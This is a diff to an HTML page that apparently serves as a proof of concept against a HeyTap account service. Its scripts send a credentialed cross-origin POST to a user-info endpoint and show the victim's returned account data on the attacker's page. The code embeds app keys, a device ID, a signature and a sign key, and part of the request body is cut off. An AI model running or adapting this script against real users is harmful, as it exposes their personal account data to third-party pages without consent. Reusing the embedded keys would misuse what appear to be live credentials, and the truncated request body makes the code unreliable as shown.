@@ -1,4 +1,5 @@
-<script>fetch("https://id-sg.heytap.com/uc/web/v1/user-info/query-basic", {
+<script>
+fetch("https://id-sg.heytap.com/uc/web/v1/user-info/query-basic", {
   "headers": {
     "x-app-acappkey": "CuGsbe6HdAe6vDBHFew2Di",
     "x-app-deviceid": "3b82f93bb3a737ae6fd9817f8ce9f1e2",
@@ -15,8 +16,79 @@
     "x-web-client-type": "pc"
   },
   "referrer": "https://id.heytap.com/",
-  "body": "\"Ik6Dp63RWsoh4ZMHxwn6kYgmbA8fPjJXPr5hd7OgA70necgbGyPaVIOzz6Rp1+0j82SAccs5VcwYgWiHKgkWJJ6etOlV0rOLZviYev4WUTGmJU8i9y/pkphZKsYedvtXlBHypbECtNYPEXWxE7ovYgVCixfK3Y4L2uDhnEcsqbQ=.hnR8OM6+1DBzC3l1PF8ngH7t4JBR8z7nC3unR47CncyxLMiEevbj815e2exeNEIAoJAwnXDi4mHouVTeaVOiKKccxf8aF4bYMX989RYzuHcAn5u6ul6VdYNtNMgss1DeW4ob/OaRRDSNi2KTBadIwNhJW0c13aDJbSKRAN7x3xc=.eBw=\"",
+  "body": "\"Ik6Dp63RWsoh4ZMHxwn6kYgmbA8fPjJXPr5hd7OgA70necgbGyPaVIOzz6Rp1+0j82SAccs5VcwYgWiHKgkWJJ6etOlV0rOLZviYev4WUTGmJU8i9y/pkphZKsYedvtXlBHypbECtNYPEXWxE7ovYgVCixfK3Y4L2uDhnEcsqbQ=.hnR8OM6+1DBzC3[...]\"",
   "method": "POST",
   "mode": "cors",
   "credentials": "include"
-});</script>
+});
+</script>
+
+
+<script>
+fetch("https://id-sg.heytap.com/uc/web/v1/user-info/query-basic", {
+  "headers": {
+    "x-app-acappkey": "CuGsbe6HdAe6vDBHFew2Di",
+    "x-app-deviceid": "3b82f93bb3a737ae6fd9817f8ce9f1e2",
+    "x-app-fromht": "true",
+    "x-app-overseaclient": "true",
+    "x-biz-appkey": "TZeSXfQXxrCyjhvARaVrmw",
+    "x-device-brand": "HEYTAP",
+    "x-device-clienttype": "WEB",
+    "x-envelope-version": "V1",
+    "x-requesttime": "1767565064629",
+    "x-sign": "b4B5KDwzXYWnoZ5jjDm6KyFda7Q=",
+    "x-sign-key": "4iAEb620alQ8s8c8ss8o0K8sS",
+    "x-timezone": "GMT+1",
+    "x-web-client-type": "pc"
+  },
+  "referrer": "https://id.heytap.com/",
+  "body": "\"Ik6Dp63RWsoh4ZMHxwn6kYgmbA8fPjJXPr5hd7OgA70necgbGyPaVIOzz6Rp1+0j82SAccs5VcwYgWiHKgkWJJ6etOlV0rOLZviYev4WUTGmJU8i9y/pkphZKsYedvtXlBHypbECtNYPEXWxE7ovYgVCixfK3Y4L2uDhnEcsqbQ=.hnR8OM6+1DBzC3[...]\"",
+  "method": "POST",
+  "mode": "cors",
+  "credentials": "include"
+})
+.then(async response => {
+  // Get response text (handles JSON as text too for display purposes)
+  const contentType = response.headers.get('content-type') || '';
+  let displayText;
+  try {
+    if (contentType.includes('application/json')) {
+      const json = await response.json();
+      displayText = JSON.stringify(json, null, 2);
+    } else {
+      displayText = await response.text();
+    }
+  } catch (err) {
+    displayText = 'Error reading response: ' + err;
+  }
+
+  // Safe HTML-escape before inserting into a <pre>
+  function escapeHtml(str) {
+    return String(str)
+      .replace(/&/g, '&amp;')
+      .replace(/</g, '&lt;')
+      .replace(/>/g, '&gt;')
+      .replace(/"/g, '&quot;')
+      .replace(/'/g, '&#39;');
+  }
+
+  // Show the response and the string "encrypted data"
+  const wrapper = document.createElement('div');
+  const pre = document.createElement('pre');
+  pre.textContent = displayText;
+  const note = document.createElement('p');
+  note.textContent = 'encrypted data';
+
+  wrapper.appendChild(pre);
+  wrapper.appendChild(note);
+  document.body.appendChild(wrapper);
+
+  // Also log to console
+  console.log(displayText, 'encrypted data');
+})
+.catch(err => {
+  const errMsg = 'Fetch error: ' + err;
+  document.body.appendChild(document.createTextNode(errMsg));
+  console.error(err);
+});
+</script>
